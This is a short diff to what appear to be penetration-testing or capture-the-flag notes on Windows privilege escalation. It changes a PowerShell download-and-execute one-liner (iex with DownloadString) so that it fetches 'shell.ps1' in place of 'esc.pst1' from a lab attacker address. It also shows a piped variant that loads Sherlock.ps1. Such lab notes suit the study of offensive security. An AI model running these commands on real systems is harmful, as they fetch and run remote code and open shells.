@@ -9,7 +9,7 @@ whoami /priv
 Once you get a shell on the box, you can run Sherlock to check if you have any vulnerable exploits
 
 ```text
-iex(new-object net.webclient).downloadstring('http://10.10.14.25/esc.pst1')
+iex(new-object net.webclient).downloadstring('http://10.10.14.28/shell.ps1')
 
 # sometimes when powershell doesn't load properly, its worth to try this way
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.25/Sherlock.ps1') | PowerShell -Noprofile -
